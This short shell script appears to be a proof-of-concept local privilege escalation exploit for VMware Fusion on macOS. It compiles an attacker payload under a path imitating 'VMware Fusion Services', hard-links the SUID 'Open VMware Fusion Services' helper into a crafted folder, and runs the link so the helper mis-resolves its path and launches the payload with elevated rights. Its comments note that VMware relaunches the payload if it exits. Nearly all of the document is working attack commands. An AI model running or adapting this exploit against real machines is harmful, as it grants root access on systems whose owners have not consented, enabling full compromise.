#!/bin/sh

# Remake the necessary folder structure
rm -rf a Contents
mkdir -p Contents/Library/services/
mkdir -p a/b/c/

# Build our payload
clang payload.c -o "Contents/Library/services/VMware Fusion Services"

# Create a hard link to the VMware SUID opener program
ln /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services a/b/c/linked

# Run the linked program, which causes it to be confused about the path, and
# launch our payload.  Additionally if our payload exits, VMware will relaunch
# it
a/b/c/linked
